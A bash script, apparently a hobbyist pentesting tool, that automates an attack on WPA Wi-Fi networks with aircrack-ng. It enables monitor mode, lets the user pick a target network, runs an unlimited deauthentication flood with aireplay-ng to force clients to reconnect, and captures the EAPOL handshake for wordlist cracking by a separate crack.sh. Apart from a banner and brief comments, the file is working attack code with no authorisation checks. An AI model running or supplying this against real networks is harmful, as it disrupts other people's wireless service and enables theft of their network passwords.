#!/bin/bash

#Author: LockTism / TinHaoTheFirst
#Purpose: Pentesting script for automatic EAPOL package capture, and decryption using wordlists
# written in bash using the aircrack-ng suite
#written for linux, on linux, cause who uses windows anyway
#"aircrack-ng" and "wordlists" are dependencies you will have to install prior to running
# I would suggest an external network adapter, most wifi-dongles work, unless you get an error complaining about "monitor mode"



#disclaimer: NOT affiliated or supported by aircrack-ng in any way, in fact they have no idea who I am




sudo -v || exit 1
clear
echo '
+====================================================================================================================+
|                                                                                                                    |
|   /$$$$$$  /$$   /$$ /$$$$$$$$/$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$       /$$   /$$  /$$$$$$  |
|  /$$__  $$| $$  | $$|__  $$__/$$__  $$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$| $$  /$$/      | $$$ | $$ /$$__  $$ |
| | $$  \ $$| $$  | $$   | $$ | $$  \ $$| $$  \__/| $$  \ $$| $$  \ $$| $$  \__/| $$ /$$/       | $$$$| $$| $$  \__/ |
| | $$$$$$$$| $$  | $$   | $$ | $$  | $$| $$      | $$$$$$$/| $$$$$$$$| $$      | $$$$$/ /$$$$$$| $$ $$ $$| $$ /$$$$ |
| | $$__  $$| $$  | $$   | $$ | $$  | $$| $$      | $$__  $\| $$__  $$| $$      | $$  $$|______/| $$  $$$$| $$|_  $$ |
| | $$  | $$| $$  | $$   | $$ | $$  | $$| $$    $$| $$  \ $$| $$  | $$| $$    $$| $$\  $$       | $$\  $$$| $$  \ $$ |
| | $$  | $$|  $$$$$$/   | $$ |  $$$$$$/|  $$$$$$/| $$  | $$| $$  | $$|  $$$$$$/| $$ \  $$      | $$ \  $$|  $$$$$$/ |
| |__/  |__/ \______/    |__/  \______/  \______/ |__/  |__/|__/  |__/ \______/ |__/  \__/      |__/  \__/ \______/  |
|                                                                                                                    |
+====================================================================================================================+'
#text made by asciiart.eu/text-to-ascii-art (font=big-money-ne)

echo
echo
read -n 1 -p "Have you already captured an EAPOL message?[y/N]: " skipCapture
echo
if [[ "$skipCapture" = "y" || "$skipCapture" = "Y" ]]; then
sudo bash ./crack.sh
elif [[ "$skipCapture" = "n" || "$skipCapture" = "N" || -z "$skipCapture" ]]; then


read -n 1 -p "Which wlan interface to monitor on?(Default is 0): " wlannum
if [ -z $wlannum ]; then
wlannum=0
fi


echo
interface=wlan$wlannum
sudo airmon-ng check kill
sudo airmon-ng start $interface
clear


sudo airodump-ng -a -abg $interface
echo
read -n 17 -p "Enter BSSID of target network: " bssid
echo
read -n 3 -p "Enter channel of target network: " channel
read -p "Enter name for IVS file: " prefix


sudo aireplay-ng -a $bssid --deauth-rc 6 -0 0 $interface &
sudo airodump-ng -w ../ivs/$prefix --output-format ivs --bssid $bssid --channel $channel $interface
sudo kill $(pidof aireplay-ng)
clear

sudo bash ./crack.sh $prefix

fi
